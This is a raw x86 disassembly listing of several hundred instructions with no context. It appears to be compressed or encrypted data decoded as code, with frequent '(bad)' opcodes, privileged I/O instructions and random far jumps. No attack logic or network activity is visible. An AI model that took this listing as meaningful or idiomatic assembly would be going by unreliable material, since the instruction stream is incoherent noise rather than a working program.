  418d3d:	pop    ecx
  418d3e:	call   0x35e3:0x62ac85d2
  418d45:	daa    
  418d46:	or     eax,0x25f107dc
  418d4b:	inc    ebp
  418d4c:	lock dec edx
  418d4e:	aad    0xda
  418d50:	and    eax,esp
  418d52:	rcl    DWORD PTR [edi],cl
  418d54:	ds aam 0x8e
  418d57:	cdq    
  418d58:	xor    ah,BYTE PTR [esi+0x32]
  418d5b:	pop    es
  418d5c:	enter  0x9b11,0xa7
  418d60:	mov    esp,0x735a3e75
  418d65:	lods   al,BYTE PTR ds:[esi]
  418d66:	mov    WORD PTR [esi-0x6c1c67ae],cs
  418d6c:	out    dx,eax
  418d6d:	sbb    BYTE PTR [edx],ah
  418d6f:	cmp    ah,BYTE PTR [eax+0x27]
  418d72:	add    eax,DWORD PTR [edi]
  418d74:	xor    ecx,ebx
  418d76:	fild   QWORD PTR [ebp-0x43]
  418d79:	xor    al,0xa5
  418d7b:	fnstcw WORD PTR [ebp+0x1b0bc56b]
  418d81:	retf   
  418d82:	(bad)  
  418d83:	in     eax,dx
  418d84:	mov    dl,0x3e
  418d86:	pop    eax
  418d87:	in     al,dx
  418d88:	lods   eax,DWORD PTR ds:[esi]
  418d89:	(bad)
  418d8c:	movhps xmm2,QWORD PTR [ebx-0x1d532873]
  418d93:	sub    edi,esp
  418d95:	pmullw mm4,mm4
  418d98:	cli    
  418d99:	scas   al,BYTE PTR es:[edi]
  418d9a:	scas   al,BYTE PTR es:[edi]
  418d9b:	inc    ebx
  418d9c:	call   0x951e:0xe9c5dc06
  418da3:	lea    edi,[ebx-0x2448fe97]
  418da9:	icebp  
  418daa:	inc    edi
  418dab:	xchg   edx,eax
  418dac:	or     BYTE PTR [esi+0x64ebd6fc],dh
  418db2:	fwait
  418db3:	ud0    edi,DWORD PTR [ebx+0x50]
  418db7:	das    
  418db8:	mov    ah,0x74
  418dba:	lahf   
  418dbb:	mov    WORD PTR [edi+0x67722f8d],es
  418dc1:	fild   WORD PTR [ebx+0x23]
  418dc4:	outs   dx,BYTE PTR ds:[esi]
  418dc5:	(bad)  [ecx]
  418dc7:	into   
  418dc8:	dec    edx
  418dc9:	std    
  418dca:	xchg   ebp,eax
  418dcb:	sbb    dl,bh
  418dcd:	xor    DWORD PTR [edx+edx*4-0x21d0b056],ebx
  418dd4:	leave  
  418dd5:	mov    ds:0xbeeec82a,al
  418dda:	sbb    BYTE PTR [ebp-0x5929168c],dl
  418de0:	xchg   DWORD PTR [ecx],edi
  418de2:	add    al,0xdd
  418de4:	mov    ecx,0xc50073f1
  418de9:	mov    edx,DWORD PTR [edi]
  418deb:	pushf  
  418dec:	mov    ebx,es
  418dee:	cmp    bl,BYTE PTR [edx]
  418df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418df1:	push   edx
  418df2:	cdq    
  418df3:	nop
  418df4:	add    al,0x85
  418df6:	dec    edi
  418df7:	push   eax
  418df8:	jmp    0x418dfc
  418dfa:	js     0x418e1a
  418dfc:	enter  0x3258,0x58
  418e00:	ret    0xdb03
  418e03:	or     BYTE PTR [ebx+0x13],0x76
  418e07:	or     eax,ecx
  418e09:	out    0x22,eax
  418e0b:	dec    eax
  418e0c:	xor    DWORD PTR [ebp+0x5d9e316],ebx
  418e12:	icebp  
  418e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e14:	ja     0x418db0
  418e16:	imul   esi,DWORD PTR [esi-0x78],0x177347e2
  418e1d:	rcl    BYTE PTR [ecx],cl
  418e1f:	inc    edi
  418e20:	cmp    esi,DWORD PTR [edx+0x3dcb645f]
  418e26:	mov    edx,DWORD PTR [esi]
  418e28:	jp     0x418daf
  418e2a:	xchg   BYTE PTR [eax+0x606ac6dd],al
  418e30:	pop    edx
  418e31:	aad    0xb
  418e33:	iret   
  418e34:	jo     0x418e00
  418e36:	das    
  418e37:	jge    0x418e6a
  418e39:	leave  
  418e3a:	dec    edi
  418e3b:	xor    al,0xf4
  418e3d:	fucomip st,st(3)
  418e3f:	imul   ebx,eax,0x3126d3c6
  418e45:	jmp    0x418e32
  418e47:	inc    DWORD PTR [esi+edi*2+0x4b81f52a]
  418e4e:	mov    edi,0x463e06ef
  418e53:	xchg   ecx,eax
  418e54:	inc    eax
  418e55:	loop   0x418e28
  418e57:	cdq    
  418e58:	dec    esi
  418e59:	fnstenv [edx-0x2db7def0]
  418e5f:	out    dx,eax
  418e60:	adc    eax,0xebdd95cd
  418e65:	inc    ebx
  418e66:	sub    al,0x8a
  418e68:	jmp    0x418e6d
  418e6a:	dec    esp
  418e6b:	data16 fstp QWORD PTR [ebp+0x7b17e56]
  418e72:	mov    bh,ch
  418e74:	nop
  418e75:	or     bl,BYTE PTR [esi+0x47bb501f]
  418e7b:	xchg   edx,eax
  418e7c:	mov    al,ds:0x1fcf7d19
  418e81:	hlt    
  418e82:	sahf   
  418e83:	jecxz  0x418eff
  418e85:	xor    DWORD PTR [ebp+0x32],esp
  418e88:	mov    edx,0x85d108d9
  418e8d:	adc    ch,dh
  418e8f:	mov    cl,0x4d
  418e91:	out    dx,al
  418e92:	pop    es
  418e93:	add    al,BYTE PTR [ecx-0x6ada9a2f]
  418e99:	jnp    0x418e49
  418e9b:	and    ah,BYTE PTR [esp+edx*1+0x2f262381]
  418ea2:	xchg   esi,ebx
  418ea4:	fbld   TBYTE PTR [ecx+0x6d]
  418ea7:	inc    esi
  418ea8:	xor    bl,BYTE PTR [edx+0x12]
  418eab:	adc    dh,ah
  418ead:	iret   
  418eae:	sub    BYTE PTR ss:[esp+edi*4],al
  418eb2:	cs popf 
  418eb4:	dec    ebp
  418eb5:	push   edx
  418eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eb7:	fidiv  WORD PTR ds:0x4e5752fb
  418ebd:	popf   
  418ebe:	push   cs
  418ebf:	inc    esp
  418ec0:	sub    al,BYTE PTR [eax-0x2f]
  418ec3:	pop    ecx
  418ec4:	xor    DWORD PTR [ecx+0x17],edx
  418ec7:	(bad)  
  418ec8:	arpl   dx,dx
  418eca:	add    eax,0x2b77fdbd
  418ecf:	inc    esp
  418ed0:	push   ebx
  418ed1:	in     al,0xd9
  418ed3:	aad    0x3c
  418ed5:	cmp    DWORD PTR [ebx+0x43eb49bc],esp
  418edb:	fsubr  QWORD PTR ds:0xfa92c8b6
  418ee1:	ins    BYTE PTR es:[edi],dx
  418ee2:	mov    dh,0xa3
  418ee4:	lea    esp,[esp+ebp*4-0xa]
  418ee8:	int    0x35
  418eea:	aam    0x9e
  418eec:	mov    bl,0xab
  418eee:	mov    al,ds:0x5972a0dd
  418ef3:	int3   
  418ef4:	xor    edx,DWORD PTR [ecx-0x4f]
  418ef7:	fidiv  DWORD PTR [ecx+0x7d]
  418efa:	rcl    BYTE PTR [esi-0x34],cl
  418efd:	(bad)  
  418efe:	and    eax,0xdbf61bf4
  418f03:	mov    ebp,0x86d6518
  418f08:	adc    DWORD PTR [edx],edx
  418f0a:	dec    esi
  418f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f0c:	sbb    ebp,0xe66f0a3a
  418f12:	add    al,0xa5
  418f14:	inc    ebx
  418f15:	fdivr  st(6),st
  418f17:	fs pop esi
  418f19:	dec    esi
  418f1a:	dec    ebx
  418f1b:	out    dx,eax
  418f1c:	pushf  
  418f1d:	ins    DWORD PTR es:[edi],dx
  418f1e:	add    edx,DWORD PTR [eax-0x78d96aac]
  418f24:	fndisi(8087 only) 
  418f26:	(bad)  
  418f27:	sbb    eax,0x7850cac7
  418f2c:	sbb    DWORD PTR [edx-0x76],edi
  418f2f:	cmp    cl,0x82
  418f32:	adc    dh,ch
  418f34:	mov    esp,0x5b69c5e1
  418f39:	je     0x418f08
  418f3b:	and    bh,cl
  418f3d:	fisubr WORD PTR ds:0x59b09049
  418f43:	xor    DWORD PTR [esi],edi
  418f45:	jmp    0xf414:0xa5de7f8f
  418f4c:	xor    ebp,ecx
  418f4e:	retf   0xdefb
  418f51:	jge    0x418f34
  418f53:	stc    
  418f54:	xor    al,0xb8
  418f56:	cld    
  418f57:	aam    0x34
  418f59:	sub    esi,ecx
  418f5b:	or     BYTE PTR [ecx-0x287423bc],0xc0
  418f62:	mov    ebx,0x652a8a52
  418f67:	fcom   DWORD PTR [ebx]
  418f69:	in     al,dx
  418f6a:	and    eax,0x9720bbbd
  418f6f:	mov    esp,0xcc24cd62
  418f74:	mov    dl,0x95
  418f76:	push   es
  418f77:	jmp    0x418f81
  418f79:	jmp    0x3b3a:0xce431695
  418f80:	into   
  418f81:	in     al,0xa8
  418f83:	setns  BYTE PTR [ecx+0x65f8ecce]
  418f8a:	cmp    BYTE PTR [edi+ebx*8-0x37],cl
  418f8e:	lods   eax,DWORD PTR ds:[esi]
  418f8f:	cld    
  418f90:	mov    eax,ds:0x9faf55bb
  418f95:	add    esp,edi
  418f97:	test   eax,0x4d125243
  418f9c:	(bad)  
  418f9d:	das    
  418f9e:	inc    eax
  418f9f:	outs   dx,DWORD PTR ds:[esi]
  418fa0:	stos   BYTE PTR es:[edi],al
  418fa1:	inc    ebp
  418fa2:	inc    ebp
  418fa3:	and    eax,0xccfba7dc
  418fa8:	bound  eax,QWORD PTR [ecx+0x5618a35a]
  418fae:	xchg   ecx,eax
  418faf:	ret    0xb540
  418fb2:	sbb    al,0xd2
  418fb4:	dec    edx
  418fb5:	dec    esi
  418fb6:	xchg   ebx,eax
  418fb7:	push   0xa91b3df3
  418fbc:	jmp    0x3777:0xd2736ce9
  418fc3:	or     eax,0xe0495ac5
  418fc9:	outs   dx,BYTE PTR ds:[esi]
  418fca:	pop    ds
  418fcb:	mov    DWORD PTR ds:0x6cea8215,esp
  418fd1:	call   0x1b36:0x586a0eab
  418fd8:	lahf   
  418fd9:	popa   
  418fda:	or     edi,DWORD PTR ds:[esi-0x4e]
  418fde:	outs   dx,BYTE PTR ds:[esi]
  418fdf:	fs inc ebx
  418fe1:	in     al,0xdd
  418fe3:	pop    esi
  418fe4:	mov    ch,0xd2
  418fe6:	fwait
  418fe7:	out    0x5d,eax
  418fe9:	jnp    0x419032
  418feb:	and    al,0x11
  418fed:	sub    al,0x46
  418fef:	sbb    al,0xb1
  418ff1:	and    esi,DWORD PTR ds:0x5c3e831
  418ff7:	daa    
  418ff8:	cli    
  418ff9:	jnp    0x418fb7
  418ffb:	test   eax,0x2bbf1318
  419000:	cmp    al,0x42
  419002:	and    edi,DWORD PTR [edi-0x772cdc3c]
  419008:	retf   
  419009:	(bad)  
  41900a:	shl    BYTE PTR ds:0xb628694b,cl
  419010:	adc    al,0xb2
  419012:	inc    esi
  419013:	mov    al,ds:0x90f10498
  419018:	sbb    dh,dl
  41901a:	dec    esp
  41901b:	xor    ebx,ecx
  41901d:	xor    dh,BYTE PTR [ebp-0xa439b26]
  419023:	in     al,0x7e
  419025:	push   ds
  419026:	out    dx,al
  419027:	sbb    al,0x51
  419029:	cmp    eax,0x4a6614d3
  41902e:	fadd   QWORD PTR gs:[ebp+0x12054d1]
  419035:	outs   dx,BYTE PTR ds:[esi]
  419036:	pop    ss
  419037:	dec    ebx
  419038:	mov    esi,ebx
  41903a:	jg     0x418fc9
  41903c:	xor    al,0xfa
  41903e:	rcpps  xmm6,XMMWORD PTR ds:0x3510c50b
  419045:	jle    0x419054
  419047:	rcl    dh,1
  419049:	inc    edi
  41904a:	or     eax,0xc5ebdcf8
  41904f:	pop    es
  419050:	adc    edx,edi
  419052:	daa    
  419053:	mov    al,0x76
  419055:	push   ds
  419056:	sti    
  419057:	repnz mov ?,WORD PTR ds:0x5e53f934
  41905e:	mov    edi,0x172d0814
  419063:	test   al,0x8f
  419065:	fisttp WORD PTR [esi-0x2a]
  419068:	lods   eax,DWORD PTR ds:[esi]
  419069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41906a:	inc    esp
  41906b:	or     eax,0xac4b6378
  419070:	bound  ebp,QWORD PTR [eax]
  419072:	push   esi
  419073:	push   esi
  419074:	inc    ecx
  419075:	loope  0x41901d
  419077:	clc    
  419078:	sub    bh,BYTE PTR [eax-0x3c]
  41907b:	in     al,0x6
  41907d:	addr16 dec ebx
  41907f:	inc    ebp
  419080:	(bad)  [esi-0x1a0be9a9]
  419086:	es pop edx
  419088:	pusha  
  419089:	pop    edi
  41908a:	sub    bl,BYTE PTR [ebp+0x46820c4d]
  419090:	xor    al,0xfb
  419092:	xchg   edx,eax
  419093:	inc    edx
  419094:	jno    0x4190a7
  419096:	pop    es
  419097:	pop    esp
  419098:	xor    ecx,DWORD PTR [edx+0x25]
  41909b:	push   esp
  41909c:	pop    edi
  41909d:	ret    
  41909e:	pop    esi
  41909f:	es jo  0x4190f1
  4190a2:	or     BYTE PTR [ebp+0x2d63a3f],ah
  4190a8:	jno    0x4190b6
  4190aa:	xchg   edi,eax
  4190ab:	pinsrw mm1,esp,0x47
  4190af:	adc    bh,cl
  4190b1:	xor    al,0xa2
  4190b3:	xchg   ecx,eax
  4190b4:	ret    
  4190b5:	or     dl,BYTE PTR es:[esi+0x223a90b1]
  4190bc:	push   edx
  4190bd:	not    DWORD PTR [ebx-0x7]
  4190c0:	nop
  4190c1:	push   ebp
  4190c2:	stos   BYTE PTR es:[edi],al
  4190c3:	loop   0x41909e
  4190c5:	cmp    ebp,DWORD PTR [eax+esi*8]
  4190c8:	loopne 0x41904d
  4190ca:	sub    bh,BYTE PTR [eax+0x6e79152c]
  4190d0:	pusha  
  4190d1:	add    bh,BYTE PTR [edi+eiz*2+0x631401fe]
  4190d8:	loopne 0x4190c6
  4190da:	mov    BYTE PTR [esi],bl
  4190dc:	es in  al,dx
  4190de:	pop    ss
  4190df:	sbb    al,0x1f
  4190e1:	imul   esp,esp,0xdcddb292
  4190e7:	js     0x41911e
  4190e9:	outs   dx,BYTE PTR ds:[esi]
  4190ea:	pop    edi
  4190eb:	cmp    eax,0x9ae62ada
  4190f0:	pop    esp
  4190f1:	std    
  4190f2:	lea    ebx,[edi]
  4190f4:	sbb    DWORD PTR [edi+edi*2],edx
  4190f7:	mov    cl,0x52
  4190f9:	inc    eax
  4190fa:	mov    dl,0xf3
  4190fc:	cmp    al,0xb6
  4190fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190ff:	add    eax,ebx
  419101:	cld    
  419102:	adc    eax,0xf8ad596
  419107:	push   0xffffff81
  419109:	and    eax,0xa2761ba0
  41910e:	mov    ebp,0x98c8021b
  419113:	daa    
  419114:	and    al,0xad
  419116:	push   esp
  419117:	sbb    al,0x42
  419119:	adc    eax,0x18152502
  41911e:	test   al,0x75
  419120:	inc    esi
  419121:	(bad)  
  419122:	fdiv   QWORD PTR [eax-0x21]
  419125:	adc    eax,0x1ef8f998
  41912a:	push   ebx
  41912b:	mov    WORD PTR [ecx-0x4fd3829b],es
  419131:	adc    BYTE PTR [esi-0x71d62e81],0xd6
  419138:	iret   
  419139:	sub    BYTE PTR [ebp-0x1a55d0fb],dl
  41913f:	mov    bl,dh
  419141:	and    esi,DWORD PTR [ebx]
  419143:	iret   
  419144:	add    DWORD PTR [esi],ebp
  419146:	pop    esi
  419147:	loop   0x41913a
  419149:	daa    
  41914a:	mov    ch,0x61
  41914c:	fnclex 
  41914e:	sub    eax,0x66b3821e
  419153:	jmp    0x4191a8
  419155:	(bad)  
  419156:	aas    
  419157:	nop
  419158:	push   ebx
  419159:	int    0x13
  41915b:	mov    ebp,ecx
  41915d:	lods   al,BYTE PTR ds:[esi]
  41915e:	sbb    ch,bh
  419160:	mov    BYTE PTR [edx+0x16a1ad89],dh
  419166:	repz ss xchg ebx,eax
  419169:	adc    BYTE PTR [ebp+0x40a0e0e4],0x31
  419170:	loope  0x419174
  419172:	aas    
  419173:	adc    ecx,edi
  419175:	push   cs
  419176:	mov    al,ds:0xead059b6
  41917b:	jns    0x419101
  41917d:	jmp    0x419193
  41917f:	lods   al,BYTE PTR ds:[esi]
  419180:	scas   eax,DWORD PTR es:[edi]
  419181:	add    al,0x82
  419183:	cmp    DWORD PTR es:[edx-0x24],ecx
  419187:	jnp    0x41914b
  419189:	mov    dh,0xb0
  41918b:	jb     0x419122
  41918d:	dec    edx
  41918e:	mov    cl,BYTE PTR [edx+0x111dfa5e]
  419194:	bound  ebp,QWORD PTR [edx-0x55166d42]
  41919a:	adc    eax,0xc8915ce6
  41919f:	xchg   ebx,eax
  4191a0:	mov    BYTE PTR [edi-0x39bb6a67],0xb1
  4191a7:	call   0x1f10:0xe1343754
  4191ae:	mov    esp,0xfa4b65aa
  4191b3:	dec    eax
  4191b4:	clc    
  4191b5:	int    0xc5
  4191b7:	pop    ds
  4191b8:	sub    al,0x53
  4191ba:	pop    ecx
  4191bb:	pop    ecx
  4191bc:	js     0x419166
  4191be:	pop    ds
  4191bf:	mov    dh,0x58
  4191c1:	out    0x79,eax
  4191c3:	ja     0x419164
  4191c5:	jecxz  0x419234
  4191c7:	neg    BYTE PTR [eax+eiz*4+0x40]
  4191cb:	inc    esp
  4191cc:	ficom  WORD PTR [esi]
  4191ce:	pop    esi
  4191cf:	mov    ah,0x85
  4191d1:	push   cs
  4191d2:	fst    QWORD PTR [ecx+eiz*2]
  4191d5:	push   esp
  4191d6:	xchg   ebp,eax
  4191d7:	jnp    0x41919e
  4191d9:	inc    eax
  4191da:	(bad)  
  4191db:	cs pop ecx
  4191dd:	push   0x344d5ccd
  4191e2:	jmp    0x4372:0x702ce4f
  4191e9:	push   0xa41ba3cb
  4191ee:	sub    al,0x4b
  4191f0:	mov    bl,0xd2
  4191f2:	clc    
  4191f3:	push   esi
  4191f4:	stc    
  4191f5:	pop    esi
  4191f6:	pushf  
  4191f7:	pop    eax
  4191f8:	(bad)  
  4191fa:	mov    esp,0x7a54dd7b
  4191ff:	pusha  
  419200:	mov    al,ds:0xc2cecad9
  419205:	stos   DWORD PTR es:[edi],eax
  419206:	adc    BYTE PTR [ebx+0x1c8cfad5],ah
  41920c:	test   eax,0xac7b5ab2
  419211:	push   edi
  419212:	jle    0x419287
  419214:	mov    DWORD PTR fs:[ebp+esi*4-0x360ab35],edi
  41921c:	nop
  41921d:	loop   0x41923f
  41921f:	jns    0x4191ab
  419221:	sub    eax,0x1fb15128
  419226:	loope  0x419242
  419228:	test   DWORD PTR [edi+ecx*2+0x11],edx
  41922c:	pop    esi
  41922d:	mov    WORD PTR [ecx],?
  41922f:	in     eax,dx
  419230:	or     bh,BYTE PTR [ecx]
  419232:	and    BYTE PTR [edi+0x109a2176],cl
  419238:	leave  
  419239:	(bad)  [edi-0x70]
  41923c:	sub    DWORD PTR [edi],edi
  41923e:	xchg   esp,eax
  41923f:	int3   
  419240:	aad    0xe
  419242:	je     0x4191de
  419244:	(bad)  
  419245:	bound  ebx,QWORD PTR [ebx-0x2]
  419248:	clc    
  419249:	sbb    BYTE PTR [edi+ebp*1],ch
  41924c:	std    
  41924d:	lds    esp,FWORD PTR [ebp-0x6f]
  419250:	sti    
  419251:	hlt    
  419252:	ins    BYTE PTR es:[edi],dx
  419253:	and    eax,DWORD PTR [esi-0x404874a]
  419259:	out    dx,al
  41925a:	(bad)  [ebp-0x43ad07ac]
  419260:	jp     0x4191f1
  419262:	int3   
  419263:	shl    BYTE PTR [esi+0x54],cl
  419266:	jle    0x4192e6
  419268:	pop    es
  419269:	mov    al,0x80
  41926c:	jmp    0x4191fa
  41926e:	mov    DWORD PTR [ebx],ebx
  419270:	retf   0x5b33
  419273:	mov    esp,0x8e262cbe
  419278:	pop    esp
  419279:	cmp    al,BYTE PTR [edx-0x22]
  41927c:	dec    ebx
  41927d:	add    ah,BYTE PTR [esi+0x6edebfde]
  419283:	int    0x5c
  419285:	push   ecx
  419286:	stos   DWORD PTR es:[edi],eax
  419287:	and    eax,0x3b1f8bb7
  41928c:	fimul  DWORD PTR [edi+0x6aa8cf41]
  419292:	mov    BYTE PTR [ecx-0x77a5b341],ch
  419298:	ret    
  419299:	mov    al,ds:0x478b999c
  41929e:	in     eax,dx
  41929f:	ds pop ds
  4192a1:	cdq    
  4192a2:	jmp    FWORD PTR [ebx-0x7d]
  4192a5:	xchg   ecx,eax
  4192a6:	(bad)  [eax]
  4192a8:	test   al,0x69
  4192aa:	xor    dl,BYTE PTR [edx+0x2f]
  4192ad:	xlat   BYTE PTR ds:[ebx]
  4192ae:	mov    esp,0xb6f658ef
  4192b3:	jnp    0x4192f9
  4192b5:	lods   al,BYTE PTR ds:[esi]
  4192b6:	cld    
  4192b7:	sbb    DWORD PTR [edx],edx
  4192b9:	fs adc al,0x3b
  4192bc:	dec    ecx
  4192bd:	and    BYTE PTR [edi+0x65],0x10
  4192c1:	inc    esi
  4192c2:	or     DWORD PTR [ebp+0x5c0da0dc],ebp
  4192c8:	pop    esp
  4192c9:	loop   0x4192f8
  4192cb:	inc    eax
  4192cc:	add    dh,dl
  4192ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192cf:	int3   
  4192d0:	aam    0xd7
  4192d2:	xor    BYTE PTR [ebx+0x22647c7d],ch
  4192d8:	stos   DWORD PTR es:[edi],eax
  4192d9:	(bad)  
  4192da:	ins    DWORD PTR es:[edi],dx
  4192db:	cmp    BYTE PTR [ebx+ecx*1+0x2d0a9546],0x49
  4192e3:	(bad)  [edx]
  4192e5:	fcom   QWORD PTR [ebx-0x74]
  4192e8:	push   cs
  4192e9:	sub    ebx,DWORD PTR [ebp-0x38]
  4192ec:	cdq    
  4192ed:	and    DWORD PTR [eax+0x67],edi
  4192f0:	leave  
  4192f1:	or     BYTE PTR [edi+0x6c6904b5],dl
  4192f7:	push   0xffffff8b
  4192f9:	in     eax,dx
  4192fa:	imul   ebx,DWORD PTR [ecx+0x6f],0xffffffb4
  4192fe:	fs push edx
  419300:	hlt    
  419301:	sahf   
  419302:	push   esi
  419303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419304:	pop    esp
  419305:	sub    bh,0x5d
  419308:	mov    dl,0x5a
  41930a:	repnz pusha 
  41930c:	mov    dl,0x45
  41930e:	xchg   esp,eax
  41930f:	stos   DWORD PTR es:[di],eax
  419311:	call   0x4e8e:0x402c4bf8
  419318:	mov    DWORD PTR [ebx+0x77f8f739],ebx
  41931e:	xor    bh,cl
  419320:	sub    BYTE PTR [edi-0x2890598],bh
  419326:	sbb    DWORD PTR [edx+0xa8106c5],esi
  41932c:	mov    esp,0xddd721d5
  419331:	pushf  
  419332:	call   DWORD PTR [ecx+edx*8]
  419335:	xchg   ebp,eax
  419336:	jmp    FWORD PTR [edi]
  419338:	(bad)  
  419339:	sar    DWORD PTR [ecx],cl
  41933b:	mov    cl,0x9d
  41933d:	push   cs
  41933e:	pop    edi
  41933f:	icebp  
  419340:	out    0x93,al
  419342:	sti    
  419343:	sbb    ebx,DWORD PTR [ebx-0x31e23a64]
  419349:	loope  0x419335
  41934b:	pop    ds
  41934c:	mov    eax,ds:0x93b20ab5
  419351:	popa   
  419352:	stc    
  419353:	test   DWORD PTR [ebx-0x5c],0x49874047
  41935a:	bswap  ebp
  41935c:	daa    
  41935d:	imul   esi,DWORD PTR [esi-0x72],0x16
  419361:	(bad)  
  419362:	push   esp
  419363:	jecxz  0x4193b5
  419365:	data16 add al,0xf8
  419368:	cs mov BYTE PTR es:0xe90ec4c1,ah
  419370:	lahf   
  419371:	retf   
  419372:	jnp    0x4193ec
  419374:	aaa    
  419375:	and    al,0xfc
  419377:	ror    DWORD PTR [ecx],1
  419379:	int3   
  41937a:	aas    
  41937b:	dec    ebx
  41937c:	jl     0x4192fe
  41937e:	push   edx
  41937f:	mov    al,ds:0xab1b542
  419384:	and    al,BYTE PTR [edx]
  419386:	not    BYTE PTR [ebp-0x4f]
  419389:	pop    ss
  41938a:	stos   BYTE PTR es:[edi],al
  41938b:	add    al,0x43
  41938d:	in     eax,dx
  41938e:	es je  0x4193b5
  419391:	jnp    0x41932c
  419393:	test   BYTE PTR cs:[ecx-0x23],ah
  419397:	sbb    BYTE PTR [esi+0x23e6a3a],bh
  41939d:	ins    BYTE PTR es:[edi],dx
  41939e:	aam    0xff
  4193a0:	jae    0x419410
  4193a2:	aaa    
  4193a3:	push   ebp
  4193a4:	test   DWORD PTR [edx+0x68cfd86f],edx
  4193aa:	stos   DWORD PTR es:[edi],eax
  4193ab:	loope  0x41941d
  4193ad:	xchg   esp,eax
  4193ae:	lods   eax,DWORD PTR ds:[esi]
  4193af:	popa   
  4193b0:	xor    DWORD PTR [ecx-0x1fb85678],ebp
  4193b6:	call   0x6821c2d7
  4193bb:	push   ecx
  4193bc:	or     bh,cl
  4193be:	xor    eax,0xdf735960
  4193c3:	sbb    esi,DWORD PTR [esi+0x1e]
  4193c6:	lods   eax,DWORD PTR ds:[esi]
  4193c7:	or     al,al
  4193c9:	arpl   WORD PTR [edx],si
  4193cb:	fld    DWORD PTR [edx+eiz*8-0x4a]
  4193cf:	inc    eax
  4193d0:	inc    edi
  4193d1:	aam    0x7c
  4193d3:	rcl    ah,cl
  4193d5:	repz add al,0x88
  4193d8:	aas    
  4193d9:	lods   al,BYTE PTR ds:[esi]
  4193da:	hlt    
  4193db:	sub    DWORD PTR [edi+ebp*1],ebp
  4193de:	and    dh,BYTE PTR [edx]
  4193e0:	popf   
  4193e1:	or     edi,edi
  4193e3:	popa   
  4193e4:	jl     0x4193dc
  4193e6:	test   BYTE PTR es:[eax+eiz*1-0x2d],cl
  4193eb:	(bad)  
  4193ec:	fild   WORD PTR [ebx]
  4193ee:	int    0x73
  4193f0:	inc    esp
  4193f1:	mov    ebp,0xf0d41e09
  4193f6:	fmul   st(3),st
  4193f8:	fcom   DWORD PTR [ecx-0x704ba4cb]
  4193fe:	sar    esp,0xad
  419401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419402:	xchg   edx,eax
  419403:	push   eax
  419404:	or     bl,dh
  419406:	xor    dh,dh
  419408:	adc    edi,DWORD PTR [ecx+0x8268cc1]
  41940e:	(bad)  
  41940f:	mov    esp,0xdde51ca0
  419414:	popf   
  419415:	push   esi
  419416:	(bad)
  419419:	pop    edi
  41941a:	jb     0x41946b
  41941c:	cli    
  41941d:	pop    ecx
  41941e:	test   al,0x7
  419420:	mov    dh,0xcc
  419422:	dec    edx
  419423:	aam    0xf5
  419425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419426:	(bad)  
  419427:	push   ecx
  419428:	pop    edx
  419429:	jne    0x419444
  41942b:	cs dec eax
  41942d:	imul   esp,DWORD PTR [esi],0xffffff95
  419430:	in     al,dx
  419431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419432:	or     eax,0x42e4ce72
  419437:	jbe    0x419400
  419439:	inc    ecx
  41943a:	jns    0x41947a
  41943c:	mov    dl,0x7c
  41943e:	jnp    0x41948c
  419440:	xor    DWORD PTR [ebp+0x63],ebx
  419443:	mov    al,ds:0xf0b8d996
  419448:	test   DWORD PTR [bx+si],edi
  41944b:	data16 loope 0x4194a9
  41944e:	adc    DWORD PTR [edx-0x68],ebx
  419451:	mov    ebx,0x1e0b0b4d
  419456:	cmp    eax,0xd14f82d
  41945b:	stos   DWORD PTR es:[edi],eax
  41945c:	mov    dh,0x3c
  41945e:	sbb    cl,0xc3
  419461:	dec    ebp
  419462:	outs   dx,BYTE PTR ds:[esi]
  419463:	ins    BYTE PTR es:[edi],dx
  419464:	int    0x52
  419466:	jns    0x41948c
  419468:	mov    bl,0x11
  41946a:	xchg   esp,eax
  41946b:	dec    esi
  41946c:	les    ecx,FWORD PTR [eax]
  41946e:	push   ebx
  41946f:	sbb    dh,dl
  419471:	jl     0x4194eb
  419473:	dec    esp
  419474:	ins    DWORD PTR es:[edi],dx
  419475:	pop    edx
  419476:	dec    ebp
  419477:	fimul  WORD PTR [ebx+0x53]
  41947a:	out    dx,al
  41947b:	fcmovnb st,st(1)
  41947d:	test   BYTE PTR [ecx+edi*8],bh
  419480:	or     BYTE PTR [eax-0xa],ah
  419483:	in     eax,0x4b
  419485:	and    BYTE PTR [esi-0x62],ch
  419488:	jbe    0x4194cd
  41948a:	adc    DWORD PTR [ebx-0x7b3058a7],ecx
  419490:	aas    
  419491:	out    dx,al
  419492:	jns    0x595a8642
  419498:	leave  
  419499:	test   al,0xdb
  41949b:	or     eax,0xe0024389
  4194a0:	pop    edi
  4194a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a2:	adc    eax,0xaa397a3a
  4194a7:	add    DWORD PTR [ebx+0x8],0xffffffd3
  4194ab:	pusha  
  4194ac:	into   
  4194ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194ae:	or     al,0x64
  4194b0:	xlat   BYTE PTR ds:[ebx]
  4194b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194b2:	lods   al,BYTE PTR ds:[esi]
  4194b3:	ins    BYTE PTR es:[edi],dx
  4194b4:	sub    eax,0x29ef2878
  4194b9:	or     esi,DWORD PTR [esi-0x766c5479]
  4194bf:	push   cs
  4194c0:	dec    edi
  4194c1:	outs   dx,BYTE PTR ds:[esi]
  4194c2:	test   BYTE PTR [ebp+0x7],ah
  4194c5:	jecxz  0x419453
  4194c7:	jns    0x4194d5
  4194c9:	cld    
  4194ca:	sub    ebx,DWORD PTR es:[eax+0x15]
  4194ce:	imul   ebx,DWORD PTR [edi+0x7a],0x21
  4194d2:	xor    al,0x89
  4194d4:	adc    eax,0x3504ac37
  4194d9:	(bad)  
  4194da:	mov    esp,0x33461649
  4194df:	sub    eax,0x693e2756
  4194e4:	aam    0xa3
  4194e6:	(bad)  
  4194e7:	dec    edi
  4194e8:	cdq    
  4194e9:	(bad)  [ecx]
  4194eb:	cwde   
